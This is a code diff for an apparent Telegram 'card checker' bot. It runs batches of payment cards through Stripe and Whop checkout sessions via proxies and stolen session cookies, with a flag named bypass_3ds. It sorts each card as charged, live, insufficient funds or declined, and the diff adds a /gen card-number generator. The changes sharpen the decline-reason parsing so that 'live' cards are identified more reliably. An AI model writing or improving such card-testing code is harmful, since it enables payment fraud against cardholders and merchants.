-        response += f"{pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>Status</b> ➳ Not Paid\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>Status</b> ➳ <b>Not Paid</b>\n"
     
     if success_url:
-        response += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ <a href=\"{success_url}\">CLICK</a>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ <a href=\"{success_url}\"><b>CLICK</b></a>\n"
     
-    response += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ {len(results)}/{len(cards)}\n\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ <b>{len(results)}/{len(cards)}</b>\n\n"
     
     # Show results
     if charged_card:
-        response += f" {charged_card['card_display']}\n"
-        response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} {charged_card['response']} ✅\n"
+        response += f"<code>{charged_card['card_display']}</code>\n"
+        response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>{charged_card['response']}</b> ✅\n"
         for r in results:
             if r != charged_card:
-                response += f" {r['card_display']}\n"
+                response += f"<code>{r['card_display']}</code>\n"
                 status_text = r['response'] if r['response'] else r['status']
-                response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['declined'], '❌')} {status_text}\n"
+                response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>{status_text}</b>\n"
     else:
         for r in card_results:
             card = r['card']
             status = r['status']
             response_text = r['response']
-            attempts = r.get('attempts', 0)
-            
-            if status == '3DS' or status == '3DS SKIP':
+
+            if status in ('3DS', '3DS SKIP'):
                 status_emoji = pe(PREMIUM_EMOJI_IDS['lock'], '🔐')
-                status_display = "3DS required"
-            elif status == 'DECLINED':
+            elif status in ('DECLINED', 'FRAUDULENT'):
                 status_emoji = pe(PREMIUM_EMOJI_IDS['declined'], '❌')
-                status_display = "declined"
             elif status == 'NOT SUPPORTED':
                 status_emoji = pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')
-                status_display = "not supported"
             elif status == 'CHARGED':
                 status_emoji = pe(PREMIUM_EMOJI_IDS['charged'], '🔥')
-                status_display = "charged ✅"
-            elif status == 'SESSION_ERROR':
+            elif status in ('SESSION_ERROR', 'SESSION_EXPIRED'):
                 status_emoji = pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')
-                status_display = "session expired"
             elif status == 'INSUFFICIENT_FUNDS':
                 status_emoji = pe(PREMIUM_EMOJI_IDS['money'], '💰')
-                status_display = "insufficient funds"
             elif status == 'CVV_LIVE':
                 status_emoji = pe(PREMIUM_EMOJI_IDS['approved'], '✅')
-                status_display = "cvv live"
             elif status == 'TIMEOUT':
                 status_emoji = pe(PREMIUM_EMOJI_IDS['time'], '⏰')
-                status_display = "timeout"
             elif status == 'PROXY_ERROR':
                 status_emoji = pe(PREMIUM_EMOJI_IDS['error'], '🔌')
-                status_display = "proxy error"
             else:
                 status_emoji = pe(PREMIUM_EMOJI_IDS['error'], '⚠️')
-                status_display = status
-            
-            response += f" {card}\n"
-            response += f"    ⤷ {status_emoji} {response_text} ({status_display})"
-            if attempts > 0:
-                response += f" [attempts: {attempts}]"
-            response += "\n"
+
+            response += f"<code>{card}</code>\n"
+            response += f"    ⤷ {status_emoji} <b>{response_text}</b>\n"
 
     await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
@@ -19231,7 +19666,10 @@ import logging
 import secrets as _sec
 import os
 from typing import Dict, Optional, List, Tuple
-from curl_cffi import requests as cf
+try:
+    from curl_cffi import requests as cf
+except Exception:  # keep the bot bootable if curl_cffi is missing
+    cf = None
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ContextTypes, CommandHandler
@@ -28202,6 +28640,15 @@ async def get_proxy_info_stripe(proxy_str: str = None, timeout: int = 10) -> dic
     return result
 
 # ============ FIXED: CHARGE CARD FUNCTION ============
+
+def _stco_log_confirm_response(response, conf):
+    """Log a Stripe /confirm reply (debug aid used by the /st flow)."""
+    try:
+        status = getattr(response, "status_code", "?")
+        print(f"🧾 [stripe] confirm HTTP {status} — {json.dumps(conf)[:600]}")
+    except Exception:
+        pass
+
 
 async def charge_card_stripe(card, checkout_data: dict, proxy_str: str = None, bypass_3ds: bool = False, max_retries: int = 3) -> dict:
     """
@@ -76193,7 +76640,9 @@ async def whop_create_confirmation_token(session_id: str, card_token: str,
 
 async def whop_confirm_legacy(session_id: str, conf_token: str,
                                 client_secret: str, cookie: str,
-                                proxy: str = None) -> Dict:
+                                proxy: str = None,
+                                card_token: str = None,
+                                account_id: str = None) -> Dict:
     headers = {
         "accept":              "*/*",
         "api-version-date":    "2026-09-06",
@@ -76209,10 +76658,35 @@ async def whop_confirm_legacy(session_id: str, conf_token: str,
         "client_secret":      client_secret,
         "attestations":       {"tos_accepted": True},
     }
+    # ── Mount the payment method explicitly ─────────────────────────────
+    # With only `confirmation_token`, Whop answers status=completed but
+    # leaves the session at `payment: null` / `mounted_payment: null` and
+    # never creates a payment attempt — so the card never reaches the
+    # issuer and every card looks like a generic "payment_failed".
+    extra = {}
+    if card_token:
+        extra["payment_method"] = {
+            "type":     "card",
+            "category": "card",
+            "card":     {"token": card_token},
+        }
+    if account_id:
+        extra["account_id"] = account_id
+
     async with whop_client(proxy, timeout=60.0) as c:
         r = await c.post(
             f"{WHOP_API_LEGACY}/checkout_sessions/{session_id}/confirm",
-            headers=headers, json=payload)
+            headers=headers, json={**payload, **extra} if extra else payload)
+        print(f"📤 [WHOP] confirm(legacy) HTTP {r.status_code}"
+              f"{' (payment_method mounted)' if extra else ''}")
+        # Unknown fields are rejected by some API versions → retry plain.
+        if extra and r.status_code >= 400:
+            print(f"⚠️ [WHOP] confirm with payment_method rejected "
+                  f"({r.status_code}); retrying without it")
+            r = await c.post(
+                f"{WHOP_API_LEGACY}/checkout_sessions/{session_id}/confirm",
+                headers=headers, json=payload)
+            print(f"📤 [WHOP] confirm(legacy, fallback) HTTP {r.status_code}")
     try:
         return r.json()
     except Exception:
@@ -76222,7 +76696,9 @@ async def whop_confirm_legacy(session_id: str, conf_token: str,
 async def whop_confirm_new(session_id: str, conf_token: str,
                             client_secret: str, cookie: str,
                             quoted_at: str, checkout_url: str,
-                            proxy: str = None) -> Dict:
+                            proxy: str = None,
+                            card_token: str = None,
+                            account_id: str = None) -> Dict:
     origin = f"https://{urlparse(checkout_url).netloc}"
     headers = {
         "accept":              "*/*",
@@ -76239,10 +76715,29 @@ async def whop_confirm_new(session_id: str, conf_token: str,
         "attestations":       {"tos_accepted": True},
         "expected_quoted_at": quoted_at,
     }
+    extra = {}
+    if card_token:
+        extra["payment_method"] = {
+            "type":     "card",
+            "category": "card",
+            "card":     {"token": card_token},
+        }
+    if account_id:
+        extra["account_id"] = account_id
+
     async with whop_client(proxy, timeout=60.0) as c:
         r = await c.post(
             f"{WHOP_API_NEW}/checkout_sessions/{session_id}/confirm",
-            headers=headers, json=payload)
+            headers=headers, json={**payload, **extra} if extra else payload)
+        print(f"📤 [WHOP] confirm(new) HTTP {r.status_code}"
+              f"{' (payment_method mounted)' if extra else ''}")
+        if extra and r.status_code >= 400:
+            print(f"⚠️ [WHOP] confirm with payment_method rejected "
+                  f"({r.status_code}); retrying without it")
+            r = await c.post(
+                f"{WHOP_API_NEW}/checkout_sessions/{session_id}/confirm",
+                headers=headers, json=payload)
+            print(f"📤 [WHOP] confirm(new, fallback) HTTP {r.status_code}")
     try:
         return r.json()
     except Exception:
@@ -76253,9 +76748,249 @@ async def whop_confirm_new(session_id: str, conf_token: str,
 #  POLLING + CLASSIFIER
 # ═══════════════════════════════════════════════════════════════════════════
 
+def _whop_reason(data: Dict) -> Tuple[str, str]:
+    """Best-effort (code, message) explaining why a Whop session failed.
+
+    Whop puts the REAL decline reason inside the payment object
+    (`decline_code` / `failure_code`), while `last_confirm_error` usually
+    only carries a generic sentence like
+
+        "This payment could not be processed right now. Please try a
+         different payment method."
+
+    That generic sentence is what used to be shown for every failed card —
+    including cards that actually failed with *insufficient funds*. Always
+    prefer the payment-level fields.
+    """
+    if not isinstance(data, dict):
+        return "", ""
+
+    pay = data.get("payment") or {}
+    if isinstance(pay, dict) and pay:
+        for key in ("decline_code", "failure_code", "error_code",
+                    "network_decline_code"):
+            if pay.get(key):
+                detail = (pay.get("failure_message")
+                          or pay.get("error_message")
+                          or pay.get("message")
+                          or "")
+                return str(pay[key]), str(detail)
+        for key in ("failure_message", "error_message", "decline_reason"):
+            if pay.get(key):
+                return "", str(pay[key])
+
+    err = data.get("last_confirm_error")
+    if isinstance(err, dict) and err:
+        return str(err.get("code") or ""), str(err.get("message") or "")
+    if isinstance(err, str) and err:
+        return "", err
+    return "", ""
+
+
+# Words that mean "the card is live, it just has no money on it".
+#
+# These MUST be matched with word boundaries. A plain substring test for
+# "nsf" also matches "tra-NSF-er", and every Whop checkout lists
+# "au_bank_transfer" as a payment method — which made EVERY card report as
+# INSUFFICIENT FUNDS.
+_WHOP_FUNDS_RE = re.compile(
+    r"\binsufficient\b"
+    r"|\bnsf\b"
+    r"|\bno\s+funds\b"
+    r"|\bnot\s+enough\s+(?:funds?|money|balance)\b"
+    r"|\binsufficient[_ \-]?funds?\b"
+    r"|\bfunds?\s+insufficient\b"
+    r"|\bnot\s+sufficient\s+funds?\b",
+    re.IGNORECASE,
+)
+
+# Only strings under one of these keys can be a decline reason. Plan names,
+# payment-method lists, item descriptions etc. are ignored completely.
+_WHOP_ERROR_KEYS = (
+    "error", "message", "reason", "decline", "failure", "failed",
+    "detail", "code", "description", "status",
+)
+
+
+def _whop_is_funds(text) -> bool:
+    """True when `text` really talks about insufficient funds."""
+    if not isinstance(text, str) or not text:
+        return False
+    return bool(_WHOP_FUNDS_RE.search(text))
+
+
+def _whop_deep_scan(obj, _depth: int = 0, _key: str = "") -> str:
+    """Find an insufficient-funds message anywhere inside a Whop payload.
+
+    Two guards against false positives:
+      • word-boundary regex (so "transfer" never matches "nsf"), and
+      • only values under error-ish keys are inspected.
+    """
+    if _depth > 8:
+        return ""
+    if isinstance(obj, str):
+        if _key and any(k in _key.lower() for k in _WHOP_ERROR_KEYS):
+            if _whop_is_funds(obj):
+                return obj
+        return ""
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            hit = _whop_deep_scan(v, _depth + 1, str(k))
+            if hit:
+                return hit
+    elif isinstance(obj, (list, tuple)):
+        for v in obj:
+            hit = _whop_deep_scan(v, _depth + 1, _key)
+            if hit:
+                return hit
+    return ""
+
+
+def _whop_verdict_line(data) -> str:
+    """One line with the fields that actually decide a Whop checkout."""
+    if not isinstance(data, dict):
+        return ""
+    pay = data.get("payment") or {}
+    err = data.get("last_confirm_error") or {}
+    block = data.get("blocking_error") or {}
+    nxt = data.get("next_action") or {}
+    rec = data.get("recommended_action") or {}
+    def _s(v, keys=("code", "message", "type", "status")):
+        if isinstance(v, dict):
+            for k in keys:
+                if v.get(k):
+                    return str(v[k])
+            return ""
+        return "" if v is None else str(v)
+    bits = [
+        f"session={data.get('status') or '-'}",
+        f"payment={_s(pay) or '-'}",
+        f"mounted={'yes' if data.get('mounted_payment') else 'no'}",
+        f"pm_required={data.get('payment_method_required')}",
+        f"confirm_err={_s(err) or '-'}",
+        f"blocking={_s(block) or '-'}",
+        f"next_action={_s(nxt) or '-'}",
+        f"recommended={_s(rec) or '-'}",
+    ]
+    return "  🔎 verdict: " + " | ".join(bits)
+
+
+def _whop_dump(label: str, data) -> None:
+    """Compact, readable dump of a raw Whop payload (debugging aid).
+
+    Prints every top-level KEY (so we can see what Whop actually returns)
+    plus a JSON slice of the error / payment related fields. This is how we
+    find where the issuer reason hides.
+    """
+    try:
+        if isinstance(data, dict):
+            keys = ", ".join(sorted(str(k) for k in data.keys()))
+            focus_keys = ("error", "fail", "decline", "payment",
+                          "attempt", "reason", "status", "message",
+                          "blocking", "next_action", "recommended",
+                          "requirement", "mounted", "identity", "promo")
+            focus = {
+                k: v for k, v in data.items()
+                if any(f in str(k).lower() for f in focus_keys)
+            }
+            raw = json.dumps(focus, ensure_ascii=False, default=str)
+            print(f"  🔎 {label} keys: {keys[:600]}")
+            print(f"  🔎 {label} focus: {raw[:1400]}")
+        else:
+            print(f"  🔎 {label}: {str(data)[:1400]}")
+    except Exception as e:
+        print(f"  🔎 {label}: dump failed {e}")
+    try:
+        line = _whop_verdict_line(data)
+        if line:
+            print(line)
+    except Exception:
+        pass
+
+
+async def whop_fetch_payment(payment_id: str, session_id: str,
+                              client_secret: str, cookie: str,
+                              api_base: str, proxy: str = None) -> Dict:
+    """Read the PAYMENT object after an attempt.
+
+    The checkout_session only ever exposes `payment: null` +
+    `last_confirm_error: payment_failed` (generic). The issuer reason
+    ("insufficient funds", "do not honor", …) is stored on the payment
+    itself, so we try the plausible per-payment endpoints and dump whatever
+    answers with HTTP 200.
+    """
+    if not payment_id:
+        return {}
+
+    headers = {
+        "accept":              "*/*",
+        "api-version-date":    "2026-09-06",
+        "whop-private-schema": "true",
+        "user-agent":          WHOP_UA,
+        "cookie":              cookie,
+    }
+    # (url, extra headers) — we do not know Whop's exact route, so try the
+    # plausible ones: query-secret, bearer-secret, and the public API
+    # versions (v2 / v5). The first 200 wins.
+    auth_variants = (
+        {},
+        {"authorization": f"Bearer {client_secret}"},
+    )
+    candidates = []
+    for base in (api_base, "https://whop.com/api/v2", "https://whop.com/api/v5",
+                 "https://api.whop.com/api/v5"):
+        candidates += [
+            (f"{base}/payments/{payment_id}", {}),
+            (f"{base}/payments/{payment_id}?client_secret={client_secret}", {}),
+        ]
+    candidates += [
+        (f"{api_base}/checkout_sessions/{session_id}/payments/{payment_id}", {}),
+        (f"{api_base}/checkout_sessions/{session_id}/payment", {}),
+        (f"{api_base}/checkout_sessions/{session_id}?client_secret={client_secret}"
+         f"&include=payment", {}),
+        (f"{api_base}/checkout_sessions/{session_id}?client_secret={client_secret}"
+         f"&expand=payment", {}),
+    ]
+
+    seen = set()
+    for url, extra in candidates:
+        for auth in auth_variants:
+            key = (url, tuple(auth.items()))
+            if key in seen:
+                continue
+            seen.add(key)
+            short = url.split("?")[0]
+            try:
+                async with whop_client(proxy) as c:
+                    r = await c.get(url, headers={**headers, **auth})
+            except Exception as e:
+                print(f"  📥 GET {short} → error {e}")
+                continue
+
+            tag = " (bearer)" if auth else ""
+            print(f"  📥 GET {short}{tag} → HTTP {r.status_code}")
+            if r.status_code != 200:
+                continue
+            try:
+                data = r.json()
+            except Exception:
+                continue
+            if isinstance(data, dict) and data:
+                _whop_dump("payment payload", data)
+                return data
+    return {}
+
+
 async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
                             api_base: str, proxy: str = None,
-                            attempts: int = 15) -> Dict:
+                            attempts: int = 10) -> Dict:
+    """Poll the checkout session until Whop gives a real verdict.
+
+    Whop's session object goes: open → (payment attaches) → completed/failed.
+    While only the generic `payment_failed` placeholder is present we keep
+    polling; the issuer reason ("insufficient funds", "do not honor", …)
+    only appears once a payment / payment attempt exists.
+    """
     headers = {
         "accept":              "*/*",
         "api-version-date":    "2026-09-06",
@@ -76266,101 +77001,136 @@ async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
     url = (f"{api_base}/checkout_sessions/{session_id}"
            f"?client_secret={client_secret}")
 
+    last = {}
     for i in range(attempts):
         await asyncio.sleep(2)
-        async with whop_client(proxy) as c:
-            r = await c.get(url, headers=headers)
+        try:
+            async with whop_client(proxy) as c:
+                r = await c.get(url, headers=headers)
+        except Exception as e:
+            print(f"  poll {i + 1}/{attempts}: request error {e}")
+            continue
 
-        if r.status_code == 200:
-            d   = r.json()
-            pay = d.get("payment") or {}
-            ps  = pay.get("status", "")
-            ss  = d.get("status", "")
-            err = d.get("last_confirm_error") or {}
-            print(f"  poll {i+1}/{attempts}: session={ss} payment={ps}")
+        if r.status_code != 200:
+            print(f"  poll {i + 1}/{attempts}: HTTP {r.status_code}")
+            continue
 
-            if ps == "succeeded":
-                return {"final": "CHARGED", "data": d}
-            if ps == "failed" or err.get("code"):
-                return {"final": "DECLINED",
-                        "message": err.get("message", ps), "data": d}
-            if ss == "requires_action" or ps == "requires_action":
-                return {"final": "3DS_REQUIRED", "data": d}
+        try:
+            d = r.json()
+        except Exception:
+            continue
 
-    return {"final": "TIMEOUT"}
+        last = d
+        pay       = d.get("payment") or {}
+        ps        = str((pay or {}).get("status") or "")
+        ss        = str(d.get("status") or "")
+        code, msg = _whop_reason(d)
+
+        # Look for the issuer message ANYWHERE in the payload.
+        funds_hit = _whop_deep_scan(d)
+
+        print(f"  poll {i + 1}/{attempts}: session={ss} payment={ps} "
+              f"code={code or '-'} funds={'yes' if funds_hit else 'no'}")
+
+        # First two polls: show the raw payload once so hidden fields are
+        # visible in the log (this is what tells us where the reason lives).
+        if i == 0:
+            _whop_dump("session payload", d)
+
+        # 1) Paid.
+        if ps == "succeeded":
+            return {"final": "CHARGED", "message": "Payment successful",
+                    "data": d}
+
+        # 2) Insufficient funds — anywhere in the payload.
+        if funds_hit:
+            return {"final": "INSUFFICIENT_FUNDS",
+                    "message": funds_hit, "data": d}
+
+        # 3) Payment attached and failed → use its real reason.
+        if ps == "failed":
+            return {"final": "DECLINED",
+                    "message": (f"{code}: {msg}".strip(": ")
+                                if (code or msg) else "Declined"),
+                    "data": d}
+
+        # 4) 3DS / SCA.
+        if ss == "requires_action" or ps == "requires_action":
+            return {"final": "3DS_REQUIRED",
+                    "message": msg or "3D Secure Required", "data": d}
+
+        # 5) A NON-generic decline code with a payment object → final.
+        if pay and code and code.lower() not in _WHOP_GENERIC_CODES:
+            return {"final": "DECLINED",
+                    "message": f"{code}: {msg}".strip(": "), "data": d}
+
+        # 6) Generic / no reason yet → keep polling (the reason is coming).
+
+    # ── Exhausted ────────────────────────────────────────────────────────
+    if last:
+        _whop_dump("final session payload", last)
+        funds_hit = _whop_deep_scan(last)
+        if funds_hit:
+            return {"final": "INSUFFICIENT_FUNDS",
+                    "message": funds_hit, "data": last}
+        code, msg = _whop_reason(last)
+        if code or msg:
+            return {"final": "DECLINED",
+                    "message": f"{code}: {msg}".strip(": "), "data": last}
+    return {"final": "TIMEOUT", "message": "Timed out waiting for Whop",
+            "data": last}
 
 
 async def whop_classify_confirm(confirm: Dict, session_id: str,
                                  client_secret: str, cookie: str,
                                  api_base: str, proxy: str = None) -> Dict:
-    status   = confirm.get("status", "")
-    last_err = confirm.get("last_confirm_error") or {}
-    payment  = confirm.get("payment") or {}
-    pay_stat = payment.get("status", "")
-    err_msg  = last_err.get("message", "")
-    err_code = last_err.get("code", "")
+    """Turn a confirm response (plus polling) into one clear verdict."""
+    status    = str(confirm.get("status") or "")
+    payment   = confirm.get("payment") or {}
+    pay_stat  = str((payment or {}).get("status") or "")
+    code, msg = _whop_reason(confirm)
+    low       = f"{code} {msg}".lower()
+    funds_hit = _whop_deep_scan(confirm)
 
+    # 1) Paid.
     if pay_stat == "succeeded":
         return {"status": "CHARGED", "message": "Payment successful"}
 
-    if status == "requires_action":
+    # 2) 3DS / SCA challenge.
+    if status == "requires_action" or pay_stat == "requires_action":
         return {"status": "3DS_REQUIRED",
-                "message": "3DS authentication required"}
+                "message": msg or "3D Secure Required"}
 
-    if last_err and err_msg:
-        return {"status": "DECLINED",
-                "message": f"{err_code}: {err_msg}"}
+    # 3) Insufficient funds — checked FIRST, even on a generic error text,
+    #    so a live-but-empty card is never reported as a plain decline.
+    if funds_hit or _whop_is_funds(low):
+        return {"status": "INSUFFICIENT_FUNDS",
+                "message": funds_hit
+                           or (f"{code}: {msg}".strip(": ") if (code or msg) else "")
+                           or "Your card has insufficient funds to complete this purchase."}
 
+    # 4) A real decline code / failed payment.
+    if pay_stat == "failed" or (code and (msg or pay_stat)):
+        detail = f"{code}: {msg}".strip(": ") if (code or msg) else "Declined"
+        # If there is no payment object yet this may just be a stale,
+        # generic session error — poll before trusting it.
+        if payment:
+            return {"status": "DECLINED", "message": detail}
+        print("⏳ [WHOP] session-level error, no payment yet → polling")
+
+    # 5) Still pending → poll for the real verdict.
     if pay_stat in ("processing", "") or status in ("completed", "open"):
         print("⏳ Polling for final status...")
         poll = await whop_poll_status(session_id, client_secret, cookie,
                                        api_base, proxy)
-        return {"status": poll["final"],
-                "message": poll.get("message", poll["final"]),
-                "poll": poll}
+        final = poll.get("final", "UNKNOWN")
+        message = poll.get("message") or final
+        res = {"status": final, "message": message, "poll": poll}
+        return res
 
-    return {"status": "UNKNOWN",
-            "message": f"status={status} pay={pay_stat}"}
-    
-async def whop_classify_confirm(confirm: Dict, session_id: str,
-                                 client_secret: str, cookie: str,
-                                 api_base: str, proxy: str = None) -> Dict:
-    status   = confirm.get("status", "")
-    last_err = confirm.get("last_confirm_error") or {}
-    payment  = confirm.get("payment") or {}
-    pay_stat = payment.get("status", "")
-    err_msg  = last_err.get("message", "")
-    err_code = last_err.get("code", "")
-
-    if pay_stat == "succeeded":
-        return {"status": "CHARGED", "message": "Payment successful"}
-
-    if status == "requires_action":
-        return {"status": "3DS_REQUIRED",
-                "message": "3D Secure Required"}
-
-    # ═══════════════════════════════════════════════════════════════════
-    #  INSUFFICIENT FUNDS → treat as LIVE / approved hit
-    # ═══════════════════════════════════════════════════════════════════
-    combined = f"{err_msg} {err_code}".lower()
-    if ("insufficient" in combined) or ("funds" in combined):
-        return {
-            "status":  "INSUFFICIENT_FUNDS",
-            "message": err_msg or "Your card has insufficient funds to complete this purchase."
-        }
-
-    if last_err and err_msg:
+    if code or msg:
         return {"status": "DECLINED",
-                "message": f"{err_code}: {err_msg}"}
-
-    if pay_stat in ("processing", "") or status in ("completed", "open"):
-        print("⏳ Polling for final status...")
-        poll = await whop_poll_status(session_id, client_secret, cookie,
-                                       api_base, proxy)
-        return {"status": poll["final"],
-                "message": poll.get("message", poll["final"]),
-                "poll": poll}
-
+                "message": f"{code}: {msg}".strip(": ")}
     return {"status": "UNKNOWN",
             "message": f"status={status} pay={pay_stat}"}
 
@@ -76531,15 +77301,32 @@ async def whop_hit(checkout_url: str, card_str: str,
     # ── Step 4: confirm ────────────────────────────────────────────────
     if flow == "legacy":
         confirm = await whop_confirm_legacy(
-            session_id, conf_token, client_secret, cookie, proxy)
+            session_id, conf_token, client_secret, cookie, proxy,
+            card_token=card_token, account_id=account_id)
     else:
         confirm = await whop_confirm_new(
             session_id, conf_token, client_secret, cookie,
-            quoted_at, checkout_url, proxy)
+            quoted_at, checkout_url, proxy,
+            card_token=card_token, account_id=account_id)
 
     out["steps"]["confirm"] = confirm
     print(f"📋 confirm status=<b>{confirm.get('status')}</b> "
           f"error=<b>{confirm.get('last_confirm_error')}</b>")
+    # Raw dump — the issuer reason is often in a field we don't know yet.
+    _whop_dump("confirm payload", confirm)
+
+    # The payment object created by this confirm. Its `id` lets us look the
+    # payment up later, where the REAL issuer reason is stored.
+    confirm_payment = confirm.get("payment") or {}
+    payment_id = str((confirm_payment or {}).get("id") or "")
+    if confirm_payment:
+        try:
+            print(f"  🔎 payment object: "
+                  f"{json.dumps(confirm_payment, default=str)[:800]}")
+        except Exception:
+            pass
+    print(f"  🔎 payment_id: {payment_id or '-'}  "
+          f"next_action={confirm.get('next_action')}")
 
     # ── Classify ───────────────────────────────────────────────────────
     result = await whop_classify_confirm(
@@ -76548,6 +77335,38 @@ async def whop_hit(checkout_url: str, card_str: str,
     out["message"] = result.get("message", "")
     if "poll" in result:
         out["steps"]["poll"] = result["poll"]
+
+    # ── Generic failure → fetch the payment and read the real reason ────
+    _generic = (out["status"] in ("DECLINED", "UNKNOWN")
+                and "payment_failed" in str(out["message"]).lower())
+    if _generic:
+        _pay_id = payment_id
+        if not _pay_id:
+            _poll = out["steps"].get("poll") or {}
+            _ppay = (_poll.get("data") or {}).get("payment") or {}
+            _pay_id = str((_ppay or {}).get("id") or "")
+        pay_data = {}
+        if _pay_id:
+            pay_data = await whop_fetch_payment(
+                _pay_id, session_id, client_secret, cookie, api_base, proxy)
+
+        if pay_data:
+            out["steps"]["payment"] = pay_data
+            funds_hit = _whop_deep_scan(pay_data)
+            code, msg = _whop_reason(pay_data)
+            if funds_hit or _whop_is_funds(f"{code} {msg}"):
+                out["status"] = "INSUFFICIENT_FUNDS"
+                out["message"] = funds_hit or msg or "Insufficient funds"
+            elif code or msg:
+                out["status"] = "DECLINED"
+                out["message"] = f"{code}: {msg}".strip(": ")
+        else:
+            # Nothing readable anywhere: do NOT claim a decline we cannot
+            # prove. The issuer decision happened, but Whop does not expose
+            # it to this client (payments/{id} → 401 without an API key).
+            out["status"] = "UNKNOWN"
+            out["message"] = ("payment_failed (issuer reason hidden by Whop "
+                              "- verify this card manually)")
 
     out["elapsed"] = round(time.time() - t0, 2)
     return out
@@ -79542,6 +80361,15 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
             except Exception:
                 pass
             return True
+
+    # ══════════════════════════════════════════════════════════════════════
+    # ── SPECIAL: /gen in reply — BIN comes from the replied message ──────
+    # ══════════════════════════════════════════════════════════════════════
+    if command == '/gen' or command.startswith('/gen@'):
+        user_args = command_text.split()
+        context.args = user_args[1:]          # drop "/gen", keep any inline BIN
+        await gen_command(update, context)
+        return True
 
     # ══════════════════════════════════════════════════════════════════════
     # ── SPECIAL: /stco and /co expect a URL + card ───────────────────────
@@ -88917,6 +89745,7 @@ def main():
     
     # ============ STRIPE CO COMMANDS ============
     app.add_handler(CommandHandler("stco", stco_command))
+    app.add_handler(CommandHandler("gen",  gen_command))
     
     # ============ JIO COMMANDS ============
     app.add_handler(CommandHandler("jhit", jhit_command))
